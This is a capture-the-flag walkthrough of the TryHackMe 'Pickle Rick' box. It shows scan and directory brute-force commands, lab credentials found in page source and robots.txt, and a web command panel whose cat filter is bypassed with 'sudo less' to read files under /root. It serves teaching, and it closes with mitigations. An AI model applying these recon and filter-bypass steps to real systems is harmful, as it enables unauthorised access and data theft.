```
 ██████╗ ██╗ ██████╗██╗  ██╗██╗     ███████╗
 ██╔══██╗██║██╔════╝██║ ██╔╝██║     ██╔════╝
 ██████╔╝██║██║     █████╔╝ ██║     █████╗
 ██╔═══╝ ██║██║     ██╔═██╗ ██║     ██╔══╝
 ██║     ██║╚██████╗██║  ██╗███████╗███████╗
 ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
 ██████╗ ██╗ ██████╗██╗  ██╗
 ██╔══██╗██║██╔════╝██║ ██╔╝
 ██████╔╝██║██║     █████╔╝
 ██╔══██╗██║██║     ██╔═██╗
 ██║  ██║██║╚██████╗██║  ██╗
 ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
     TryHackMe — Pickle Rick
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-06 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~8 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)
- [SEO & Publishing](#-seo--publishing)

---

## Progress Checklist

- [x] Port scan (not in notes — *assumed standard SSH + HTTP*)
- [x] Discovered username `R1ckRul3s` in HTML source comment
- [x] Discovered password `Wubbalubbadubdub` in `robots.txt`
- [x] Web directory brute force — found `login.php` and `portal.php`
- [x] Logged into portal with discovered credentials
- [x] Identified command execution panel
- [x] Enumerated webroot via `ls`
- [x] Bypassed `cat` restriction using `sudo less`
- [x] Retrieved ingredient 1 from webroot
- [x] Retrieved ingredient 2 from `/home/rick/`
- [x] Retrieved ingredient 3 from `/root/`

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap — port scanning and service detection
- 🕷️ Feroxbuster — web directory enumeration
- 🌐 Browser (View Source) — credential discovery
- 💻 Web Command Panel — remote command execution via the portal

---

## ⚡ TL;DR

Rick left his username in an HTML comment and his password in `robots.txt`. Logging into the web portal revealed a command execution panel — with `cat` blocked but `sudo less` wide open. Three ingredients (flags) collected by reading files across the webroot, `/home/rick/`, and `/root/`, no shell required.

---

## 📖 Introduction

Today's patient is **Pickle Rick** — a Rick and Morty themed box where the scientist has, once again, turned himself into a pickle and needs Morty to recover three secret ingredients from his own computer. The machine is essentially a PHP web app wearing a cartoon costume, and it has the operational security of someone who tapes their password to the bottom of their keyboard and then writes a note about it on a sticky on the monitor. The lore is delightful. The security posture is not.

### Prerequisites

Readers are assumed to know:

- Basic Linux file system navigation (`ls`, directory paths)
- How to read web page source and check `robots.txt`
- What a web-based command execution panel is

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap handles service fingerprinting:*

```bash
rustscan -a 10.49.134.98 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH (*version not recorded*) |
| 80/tcp | HTTP | Apache (Ubuntu) |

Standard two-port target. The web server is where everything happens.

### HTML Source — Username in a Comment

The homepage greets us with Rick's plea for help. One `Ctrl+U` later:

*Viewing the raw HTML source of the homepage:*

```
view-source:http://10.49.134.98/
```

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

Half the credentials, delivered in the first thirty seconds. Rick is his own worst enemy.

### robots.txt — Password in Plain Sight

*Checking the standard robots exclusion file:*

```
http://10.49.134.98/robots.txt
```

```
Wubbalubbadubdub
```

That's it. The entire file. No `User-agent`, no `Disallow` — just the password sitting there like it owns the place. `robots.txt` is not a security mechanism; it's a suggestion to search engine crawlers, and every attacker checks it within the first minute.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `R1ckRul3s` | `Wubbalubbadubdub` | HTML comment / `robots.txt` |

### Web Directory Enumeration

*(~5 mins into the box)*

*Feroxbuster with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.49.134.98/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
200  http://10.49.134.98/login.php
302  http://10.49.134.98/portal.php  =>  login.php   # ^^^ redirects unauthenticated users
200  http://10.49.134.98/robots.txt
200  http://10.49.134.98/index.html
```

`portal.php` redirects to `login.php` when unauthenticated — meaning there *is* a session gate, but we already have the key.

---

## 🚪 Foothold

*(~6 mins into the box)*

Navigating to `login.php` and submitting `R1ckRul3s` / `Wubbalubbadubdub` drops us into `portal.php` — Rick's command and control panel, complete with a navigation bar for Commands, Potions, Creatures, and Beth Clone Notes. Everything except Commands redirects to `denied.php`:

```
Only the REAL rick can view this page..
```

The Commands page, however, is fully functional. It's a text input that executes arbitrary system commands and returns the output directly in the browser. There's no authentication beyond the session cookie — and we're already authenticated.

---

## 🐚 Shell / Access

No reverse shell was needed for this challenge. The web command panel provided sufficient access to read all three ingredient files directly. *In a real engagement this panel would be the first step toward establishing a proper reverse shell for persistent access.*

---

## 💥 Exploitation

*(~8 mins into the box)*

### Webroot Enumeration

*Listing the contents of the web server's document root:*

```bash
ls
```

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Two files of interest: `Sup3rS3cretPickl3Ingred.txt` (ingredient 1) and `clue.txt`.

### The `cat` Block

Attempting the obvious:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

`cat` is blacklisted. This is a denylist approach to command filtering — blocking specific command names rather than allowing only safe ones. Denylists are notoriously incomplete; Linux has dozens of ways to read a file.

### Bypassing the Filter — `sudo less`

`sudo less` works because the filter blocks `cat` by name, not by capability. `less` is a file pager, `sudo` elevates the execution — and crucially, the `www-data` user running the web server has been granted passwordless `sudo` access, which is its own separate misconfiguration.

*Reading ingredient 1 via `sudo less`:*

```bash
sudo less Sup3rS3cretPickl3Ingred.txt
```

```
mr. meeseek hair
```

*Reading the clue file to confirm next steps:*

```bash
sudo less clue.txt
```

```
Look around the file system for the other ingredient.
```

### Ingredient 2 — `/home/rick/`

*Enumerating home directories:*

```bash
ls /home
```

```
rick
ubuntu
```

```bash
ls /home/rick
```

```
second ingredients
```

The filename has a space in it, which requires quoting when referenced as an argument.

*Reading ingredient 2 with proper quoting:*

```bash
sudo less /home/rick/"second ingredients"
```

```
1 jerry tear
```

### Ingredient 3 — `/root/`

The `www-data` user has `sudo` access, which means it can read files in `/root/` — a directory normally accessible only to root.

*Checking root's home directory:*

```bash
sudo ls /root
```

```
3rd.txt
snap
```

*Reading the final ingredient:*

```bash
sudo less /root/3rd.txt
```

```
3rd ingredients: fleeb juice
```

All three ingredients recovered.

---

## 🐇 Rabbit Holes

### `sudo head` on the Second Ingredient

After discovering the filename, the first instinct was `sudo head`:

```bash
sudo head /home/rick/second ingredients
```

```
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

`head` is also on the blocklist — same category of tool as `cat`. Switching to `less` resolved it immediately. *This took an embarrassingly short time to figure out, but it's worth noting that any file-reading utility not on the denylist will work here.*

---

## 🏁 Flag

| Ingredient | Value | Location |
| --- | --- | --- |
| 1st ingredient | `mr. meeseek hair` | `Sup3rS3cretPickl3Ingred.txt` (webroot) |
| 2nd ingredient | `1 jerry tear` | `/home/rick/second ingredients` |
| 3rd ingredient | `fleeb juice` | `/root/3rd.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Username hardcoded in HTML comment | Medium | Never store credentials or usernames in client-deliverable files; use server-side session management |
| Password stored in `robots.txt` | Critical | `robots.txt` is publicly readable — never store sensitive data there |
| Unauthenticated command execution panel | Critical | Remove or gate any command execution interface behind strong multi-factor authentication; ideally, don't expose one at all |
| `cat`/`head` denylist instead of allowlist | High | Allowlist-only approach: define exactly which commands are permitted rather than trying to block dangerous ones by name |
| `www-data` granted passwordless `sudo` | Critical | Web server processes should run with minimal privileges; never grant `sudo` to the web service account |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** A command filter is only as strong as its list is complete — blocking `cat` while leaving `less`, `more`, `tail`, `strings`, `grep`, `awk`, and a hundred other file-reading utilities open is not security, it's theatre. Always allowlist what's permitted rather than trying to denylist what isn't.

---

## 🔁 If I Did It Again

Check `robots.txt` before running Feroxbuster — the password was sitting there on the first manual check, and the directory scan added five minutes without finding anything the manual review hadn't already surfaced.

---

## 🔚 Changelog

*Last updated: 2026-06-06*

---
